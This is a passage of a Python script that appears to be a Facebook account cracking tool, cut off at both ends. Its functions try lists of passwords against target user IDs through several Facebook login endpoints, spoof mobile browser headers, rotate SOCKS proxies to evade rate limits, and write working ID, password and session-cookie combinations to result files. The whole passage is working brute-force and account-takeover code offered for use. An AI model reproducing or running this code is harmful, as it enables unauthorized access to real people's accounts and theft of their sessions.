		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
def crackfreereg(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Free Reguler [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ua = random.choice(ugen8)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cros','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://free.facebook.com/?stype=lo&jlou=AfeHk-CAJvdGaHk4jrPG5UtFn4CKHtir7fjddC1Yn0kMD7n1Kct_NlHp4ILanYLiuOMHerEBIaAAGZpqIronHYoLKX2b3Z4J_2orkzUezPFFPw&smuh=4646&lh=Ac_94l2RFc-vs30xNbg&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="8"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','referer': 'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://free.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1

###----------[ ASYNC ]----------###
def crackapi(idf,pwv,nmf):
	global loop,ok,cp
	ua = random.choice(ugen8)
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]B-api {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'm.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v16.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'ASSqfFh8929p35Kn6/R+D8OSctQbVgiX+Pxpn8s5dImzlZcynOPPu9rnz5V0PKDXfbEwqT0VshbByU46SqsrXQ==','content-length': '332','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=793139305026776&kid_directed_site=0&app_id=793139305026776&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://developers.facebook.com/login/device-based/regular/login/?api_key=793139305026776&auth_token=0b6ec682004f184c19b735a0633758a7&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D793139305026776%26redirect_uri%3Dhttps%253A%252F%252Fmuyu2019.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Db0a1bc78-04e0-4998-b19b-3a18e7643195%26tp%3Dunspecified&refsrc=deprecated&app_id=793139305026776&cancel=https%3A%2F%2Fmuyu2019.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D85c55c0b08f9baf02f2aa21cab5f7621%23_%3D_&lwv=100&locale2=id_ID&refid=9',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
#-------[METHOD X.FACEBOOK.COM]--------#
def colmek1(idf,pwv,nmf):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen8)
	ses = requests.Session()
	prog.update(des,description=f'\r[deep_white]x.facebok.com [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://x.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://x.facebook.com/login.php?skip_api_login=1&api_key=123481471329046&kid_directed_site=0&app_id=123481471329046&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D123481471329046%26state%3D97cgz67n%26redirect_uri%3Dhttps%253A%252F%252Fplogin.jd.id%252Fcgi-bin%252Fmlogin%252Ffacebookcallback%26scope%3Demail%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D7da29ea1-31ba-4b07-a30d-9fdafc8bfdd7%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fplogin.jd.id%2Fcgi-bin%2Fmlogin%2Ffacebookcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D97cgz67n%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'x.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
				elif 'ya' in gabriel:
					cp+=1
					tree = Tree(f" ")
					tree.add(f"\r[yellow]Nama Anda : {nmf}[white] ").add(f"\r[yellow]{idf}|{pw}[white]")
					#tree.add(f"\r[red]{ua}[white]")
					Buat(tree)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
					break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					ok+=1
					kuki = convert(ses.cookies.get_dict())
					idf = re.findall('c_user=(.*);xs', kuki)[0]
					tree = Tree(f"  ")
					tree.add(f"\r[green]Nama Anda : {nmf}[white]").add(f"\r[green]{idf}|{pw}[white] ").add(f"\r[green]{ua}[white] ")
					tree.add(f"\r[purple]{kuki}[white] ")
					Buat(tree)
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					cek_apk(kuki)
					break		
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			prog.update(des,description=f'\r[deep_white]{M2}IP spam {P2}[{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
			prog.advance(des)
			time.sleep(31)
	loop+=1
	
#-------[METHOD MOBILE BY ASEPITGANS]--------#
def wetv(idf,pwv,nmf):
	global loop,ok,cp
	bi = random.choice(['\33[m'])
	pers = loop*100/len(id2)
	fff = '%'
	prog.update(des,description=f'\r[deep_white]Mobile Wetv [{H2}{idf}{P2}] {(loop)}/{len(id)}[/] [green]OK[/]:[green]{(ok)} [/]=[yellow] CP[/]:[yellow]{(cp)}')
	prog.advance(des)
	ses = requests.Session()
	ua = random.choice(ugen8)
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=253259228690463&kid_directed_site=0&app_id=253259228690463&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D253259228690463%26cbt%3D1683050049643%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3398ed0a913c2%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%26client_id%3D253259228690463%26display%3Dtouch%26domain%3Dwetv.vip%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwetv.vip%252Fid%26locale%3Den_US%26logger_id%3Df30bf96e550f908%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df17db5ef6bc86dc%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%2526frame%253Df1e2d765f47980c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df17db5ef6bc86dc%26domain%3Dwetv.vip%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwetv.vip%252Ff2ae15024f219a8%26relation%3Dopener%26frame%3Df1e2d765f47980c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=253259228690463&kid_directed_site=0&app_id=253259228690463&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D253259228690463%26cbt%3D1683050049643%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3398ed0a913c2%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%26client_id%3D253259228690463%26display%3Dtouch%26domain%3Dwetv.vip%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwetv.vip%252Fid%26locale%3Den_US%26logger_id%3Df30bf96e550f908%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df17db5ef6bc86dc%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%2526frame%253Df1e2d765f47980c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df17db5ef6bc86dc%26domain%3Dwetv.vip%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwetv.vip%252Ff2ae15024f219a8%26relation%3Dopener%26frame%3Df1e2d765f47980c%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login.php?skip_api_login=1&api_key=253259228690463&kid_directed_site=0&app_id=253259228690463&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.3%2Fdialog%2Foauth%3Fapp_id%3D253259228690463%26cbt%3D1683050049643%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df3398ed0a913c2%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%26client_id%3D253259228690463%26display%3Dtouch%26domain%3Dwetv.vip%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwetv.vip%252Fid%26locale%3Den_US%26logger_id%3Df30bf96e550f908%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df17db5ef6bc86dc%2526domain%253Dwetv.vip%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwetv.vip%25252Ff2ae15024f219a8%2526relation%253Dopener%2526frame%253Df1e2d765f47980c%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26sdk%3Djoey%26version%3Dv3.3%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df17db5ef6b